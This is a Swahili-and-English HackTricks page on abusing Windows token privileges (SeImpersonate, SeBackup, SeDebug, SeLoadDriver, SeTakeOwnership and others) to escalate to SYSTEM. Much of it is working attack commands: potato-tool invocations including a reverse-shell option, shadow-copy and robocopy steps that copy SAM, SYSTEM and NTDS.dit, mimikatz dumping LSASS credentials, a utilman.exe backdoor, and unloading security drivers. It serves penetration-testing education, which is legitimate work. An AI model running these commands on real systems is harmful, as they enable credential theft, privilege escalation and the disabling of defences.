# Kutumia vibaya Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Kama **hujui Windows Access Tokens ni nini** soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Huenda ukaweza kuongeza privileges kwa kutumia vibaya tokens ambazo tayari unazo**

### SeImpersonatePrivilege

Hii ni privilege inayoshikiliwa na mchakato wowote unaoruhusu impersonation (lakini si creation) ya token yoyote, mradi tu handle kwake inaweza kupatikana. Privileged token inaweza kupatikana kutoka kwa Windows service (DCOM) kwa kuishawishi ifanye NTLM authentication dhidi ya exploit, kisha kuruhusu utekelezaji wa process yenye SYSTEM privileges. Vulnerability hii inaweza kutumiwa kwa kutumia tools mbalimbali, kama [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (ambayo inahitaji winrm kuwa disabled), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato ni legacy**: kwenye Windows 10 1809+/Server 2019+, tumia **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer** kutegemea ni RPC/COM surface gani bado inaweza kufikiwa.
- Ukiathiri service inayoendeshwa kama **`LOCAL SERVICE`** au **`NETWORK SERVICE`** na `whoami /priv` inaonyesha **filtered token** bila `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, kwanza rudisha **default privilege set** ya akaunti (kwa mfano kwa **FullPowers**) kisha ujaribu tena familia ya potato baadae.
- Baadhi ya forks mpya ni rahisi zaidi kwa operator kuliko tools za asili. Kwa mfano, **SigmaPotato** inaongeza reflection/in-memory execution na uoanifu wa kisasa wa Windows, huku **PrintNotifyPotato** ikitumia vibaya PrintNotify COM service na mara nyingi ni muhimu wakati classic Spooler path imezimwa.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Ni sawa sana na **SeImpersonatePrivilege**, itatumia **njia ile ile** kupata privileged token.\
Kisha, privilege hii inaruhusu **kuassign primary token** kwa process mpya/suspended. Ukiwa na privileged impersonation token unaweza kutengeneza primary token (DuplicateTokenEx).\
Ukiwa na token, unaweza kuunda **process mpya** kwa kutumia 'CreateProcessAsUser' au kuunda process ikiwa suspended na **kuiweka token** (kwa ujumla, huwezi kubadilisha primary token ya process inayokwenda).

### SeTcbPrivilege

Ukiwa umewasha token hii unaweza kutumia **KERB_S4U_LOGON** kupata **impersonation token** kwa user mwingine yeyote bila kujua credentials, **ongeza arbitrary group** (admins) kwenye token, weka **integrity level** ya token kuwa "**medium**", na assign token hii kwa **current thread** (SetThreadToken).

### SeBackupPrivilege

System husababisha **kutoa all read access** control kwa file yoyote (limited to read operations) kupitia privilege hii. Hutumiwa kwa **kusoma password hashes za local Administrator** accounts kutoka kwenye registry, baada ya hapo tools kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa na hash hiyo (Pass-the-Hash technique). Hata hivyo, technique hii hushindwa katika hali mbili: Local Administrator account ikiwa disabled, au wakati policy ipo inayowaondolea administrative rights Local Administrators wanaounganisha remotely.\
Kwa vitendo, workflow ya built-in iliyo ya kuaminika zaidi kawaida ni **VSS + `robocopy /b`**: create/expose shadow copy, kisha copy `SAM`/`SYSTEM` au `NTDS.dit` katika **backup mode**, ambayo hupita file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Unaweza **kudhulumu privilege hii** kwa kutumia:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kufuata **IppSec** katika [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **escalating privileges with Backup Operators** ya:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ruhusa ya **write access** kwa faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili, hutolewa na privilege hii. Inafungua uwezekano mwingi wa escalation, ikiwemo uwezo wa **modify services**, kufanya DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options miongoni mwa mbinu nyingine mbalimbali.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni ruhusa yenye nguvu, hasa muhimu wakati mtumiaji ana uwezo wa impersonate tokens, lakini pia hata bila SeImpersonatePrivilege. Uwezo huu unategemea uwezo wa impersonate token ambayo inawakilisha mtumiaji yuleyule na ambayo integrity level yake haizidi ile ya process ya sasa.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kwa EoP kwa impersonating tokens chini ya masharti fulani.
- **Conditions for Token Impersonation:** Impersonation yenye mafanikio inahitaji target token iwe ya mtumiaji yuleyule na iwe na integrity level ambayo ni ndogo au sawa na integrity level ya process inayojaribu impersonation.
- **Creation and Modification of Impersonation Tokens:** Watumiaji wanaweza kuunda impersonation token na kuiimarisha kwa kuongeza SID (Security Identifier) ya privileged group.

### SeLoadDriverPrivilege

Privilege hii inaruhusu **load and unload device drivers** kwa kuunda registry entry yenye values maalum za `ImagePath` na `Type`. Kwa kuwa direct write access kwa `HKLM` (HKEY_LOCAL_MACHINE) imezuiwa, `HKCU` (HKEY_CURRENT_USER) lazima itumike badala yake. Hata hivyo, ili kufanya `HKCU` itambulike na kernel kwa ajili ya driver configuration, lazima njia maalum ifuatwe.

Matumizi ya kisasa ya offensive kwa kawaida ni **BYOVD** (bring your own vulnerable driver): load **signed but vulnerable** kernel driver na kisha tumia IOCTLs zake kuzima protections au kuruka hadi kernel code execution. Kumbuka kuwa kwenye recent Windows 11/Server builds **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huvunja older public chains, hivyo classic `szkg64.sys`-style examples hazitegemeki kwa wote tena.

Njia hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya current user. Ndani ya `HKCU`, njia hii yote lazima iundwe, na values mbili zinahitaji kuwekwa:

- `ImagePath`, ambayo ni njia ya binary itakayotekelezwa
- `Type`, yenye value `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Fikia `HKCU` badala ya `HKLM` kutokana na restricted write access.
2. Unda njia `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya current user.
3. Weka `ImagePath` kuwa njia ya execution ya binary.
4. Weka `Type` kuwa `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
More ways to abuse this privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii ni sawa na **SeRestorePrivilege**. Kazi yake kuu huruhusu process **kuchukua ownership ya object**, ikikwepa hitaji la explicit discretionary access kupitia utoaji wa WRITE_OWNER access rights. Mchakato unahusisha kwanza kuhakikisha ownership ya registry key lengwa kwa madhumuni ya kuandika, kisha kubadilisha DACL ili kuwezesha write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Hii privilege inaruhusu **debug other processes**, ikiwemo kusoma na kuandika katika memory. Mikakati mbalimbali ya memory injection, inayoweza kukwepa antivirus nyingi na host intrusion prevention solutions, inaweza kutumika kwa privilege hii.

Kwenye Windows za kisasa, kumbuka kuwa `SeDebugPrivilege` kwa kawaida inatosha kufungua **non-protected SYSTEM processes** na ku-duplicate tokens zao, lakini **sio** hakikisho kuwa unaweza kugusa **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewezeshwa, non-protected processes haziwezi kusoma au ku-inject kwenye LSASS hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, iba token kutoka SYSTEM process nyingine isiyo ya PPL, au fanya chain na PPL bypass/BYOVD badala ya kudhani `procdump` itafanya kazi. Kwa mfano kamili wa token-copy ukitumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) ili **capture the memory of a process**. Kwa uangalifu, hii inaweza kutumika kwa process ya **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambayo inawajibika kuhifadhi user credentials mara user anapofanikiwa kuingia kwenye system.

Kisha unaweza kupakia dump hii katika mimikatz ili kupata passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ukish wanti kupata `NT SYSTEM` shell unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Haki hii (Perform volume maintenance tasks) inaruhusu kufungua raw volume device handles (kwa mfano, \\.\C:) kwa direct disk I/O inayopitisha NTFS ACLs. Kwa hiyo unaweza kunakili bytes za faili yoyote kwenye volume kwa kusoma underlying blocks, hivyo kuwezesha arbitrary file read ya nyenzo nyeti (kwa mfano, machine private keys katika %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS kupitia VSS). Ni ya athari kubwa hasa kwenye CA servers ambapo kutoa nje CA private key huwezesha kutengeneza Golden Certificate ya kuiga principal yoyote.

Angalia techniques na mitigations za kina:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Tokeni **zinazoonekana kama Disabled** kwa kawaida zinaweza kuenableiwa, kwa hiyo mara nyingi unaweza kutumia vibaya both _Enabled_ na _Disabled_ privileges.

### Enable All the tokens

Kama una disabled privileges, unaweza kutumia script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) ili kuenable tokeni zote:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Au **script** iliyo ndani ya [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Jedwali

Full token privileges cheatsheet ipo hapa [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), muhtasari hapa chini utaorodhesha tu njia za moja kwa moja za kutumia privilege ili kupata admin session au kusoma faili nyeti.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Asante [Aurélien Chalot](https://twitter.com/Defte_) kwa update. Nitajaribu kuibadili iwe ya mtindo wa recipe hivi karibuni.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Soma faili nyeti kwa `robocopy /b` au helpers maalum za copy zinazojua SeBackup.                                                                                                                                                                                                                                                                 | <p>- Nzuri kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi kutumia, lakini SeBackup cmdlets/APIs maalum mara nyingi ni rahisi zaidi kwa faili zilizofungwa/zilizo wazi.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token ikijumuisha local admin rights kwa `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate **non-PPL** SYSTEM token au dumupa memory kutoka kwenye process isiyolindwa.                                                                                                                                                                                                                                                                 | <p>LSASS dumping mara nyingi huzuiwa ikiwa RunAsPPL/LSA Protection imewezeshwa.</p><p>Script ipatikane hapa [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Tumia **Potato family** / named-pipe impersonation kuanzisha SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Inafanya kazi zaidi kutoka kwenye service accounts kama IIS APPPOOL, MSSQL, scheduled tasks, au context yoyote ambayo tayari inamiliki `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load signed-but-vulnerable kernel driver (BYOVD)<br>2. Tumia driver's IOCTLs kupata kernel R/W, disable security tooling, au elevate hadi SYSTEM<br><br>Vinginevyo, privilege inaweza kutumika ku-unload security-related drivers kwa <code>fltMC</code> builtin command, yaani <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers kama <code>szkg64.sys</code> zinazidi kuzuiwa kwenye Windows za kisasa na vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Zindua PowerShell/ISE ukiwa na SeRestore privilege ipo.<br>2. Washa privilege kwa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Badilisha jina la utilman.exe kuwa utilman.old<br>4. Badilisha jina la cmd.exe kuwa utilman.exe<br>5. Funga console na bonyeza Win+U</p> | <p>Attack inaweza kugunduliwa na baadhi ya AV software.</p><p>Njia mbadala hutegemea kubadilisha service binaries zilizohifadhiwa ndani ya "Program Files" kwa kutumia privilege hiyo hiyo</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Badilisha jina la cmd.exe kuwa utilman.exe<br>4. Funga console na bonyeza Win+U</p>                                                                                                                                       | <p>Attack inaweza kugunduliwa na baadhi ya AV software.</p><p>Njia mbadala hutegemea kubadilisha service binaries zilizohifadhiwa ndani ya "Program Files" kwa kutumia privilege hiyo hiyo.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipiulate tokens ili ziwe na local admin rights zilizojumuishwa. Huenda ikahitaji SeImpersonate.</p><p>Bado inahitaji kuthibitishwa.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Tazama jedwali hili linalofafanua Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Tazama [**paper hii**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) kuhusu privesc kwa kutumia tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
